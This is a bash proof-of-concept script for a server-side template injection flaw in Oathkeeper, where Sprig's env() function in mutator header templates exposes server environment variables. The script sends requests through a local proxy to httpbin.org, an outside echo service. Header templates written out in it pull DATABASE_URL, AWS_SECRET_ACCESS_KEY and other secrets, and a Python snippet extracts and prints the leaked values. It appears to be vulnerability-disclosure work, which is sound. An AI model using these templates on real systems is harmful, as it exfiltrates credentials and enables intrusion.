#!/usr/bin/env bash
#
# VULN #2 PoC: Server-Side Template Injection — Environment Variable Leakage
# ===========================================================================
#
# This PoC demonstrates that Go text/template with Sprig's `env` function
# allows leaking server environment variables through mutator header templates.
#
# SETUP (run this INSTEAD of the main docker-compose):
#
#   cd poc/
#   docker-compose -f docker-compose-ssti.yml up -d
#   sleep 5
#   bash poc_ssti.sh
#   docker-compose -f docker-compose-ssti.yml down
#

set -euo pipefail

PROXY="http://127.0.0.1:4455"
API="http://127.0.0.1:4456"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${BOLD}${YELLOW}VULN #2: Server-Side Template Injection via Sprig env()${NC}"
echo -e "${YELLOW}===========================================================${NC}"
echo ""
echo -e "File: ${CYAN}x/template.go:15-41${NC}"
echo -e "CWE:  CWE-1336 (Improper Neutralization of Special Elements in Template)"
echo ""

# Check alive
if ! curl -sf "${API}/health/alive" > /dev/null 2>&1; then
  echo -e "${RED}ERROR: Oathkeeper not running. Start with:${NC}"
  echo "  docker-compose -f docker-compose-ssti.yml up -d && sleep 5"
  exit 1
fi

echo -e "${BOLD}Step 1: Verify the SSTI rule is loaded${NC}"
echo '$ curl -s '"${API}/rules/ssti-env-leak"' | python3 -m json.tool'
echo ""
curl -s "${API}/rules/ssti-env-leak" | python3 -m json.tool 2>/dev/null || \
  curl -s "${API}/rules/ssti-env-leak"
echo ""

echo -e "${BOLD}Step 2: Send request through the proxy to trigger template rendering${NC}"
echo ""
echo "The rule has these header templates:"
echo '  X-Env-Leaked:  {{ env "SECRET_ENV_VAR" }}'
echo '  X-DB-Leaked:   {{ env "DATABASE_URL" }}'
echo '  X-AWS-Leaked:  {{ env "AWS_SECRET_ACCESS_KEY" }}'
echo '  X-Home-Dir:    {{ env "HOME" }}'
echo ""
echo "httpbin.org will echo back all headers it receives, including the injected ones."
echo ""
echo '$ curl -s '"${PROXY}/ssti/test"
echo ""

RESPONSE=$(curl -s "${PROXY}/ssti/test")
echo "$RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$RESPONSE"
echo ""

echo -e "${BOLD}Step 3: Extract leaked environment variables from httpbin response${NC}"
echo ""
echo "$RESPONSE" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    headers = data.get('headers', {})
    leaked = {k: v for k, v in headers.items()
              if k.lower().startswith('x-') and k.lower() not in ('x-user', 'x-amzn-trace-id')}
    if leaked:
        print('  LEAKED ENVIRONMENT VARIABLES:')
        for k, v in leaked.items():
            print(f'    {k}: {v}')
    else:
        print('  No custom headers found in response (httpbin may be down)')
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null

echo ""
echo -e "${RED}[VULNERABLE] The Sprig env() function in templates leaks server env vars!${NC}"
echo ""
echo -e "${BOLD}Impact:${NC}"
echo "  - Any rule author with config access can exfiltrate ALL env vars"
echo "  - Database credentials, AWS keys, API secrets are exposed"
echo "  - Values are sent to the upstream server in HTTP headers"
echo ""
echo -e "${BOLD}Root cause:${NC}"
echo "  x/template.go:40 -> Funcs(sprig.TxtFuncMap())"
echo "  Sprig includes: env, expandenv, getHostByName"
echo "  These are server-side functions exposed to template authors"
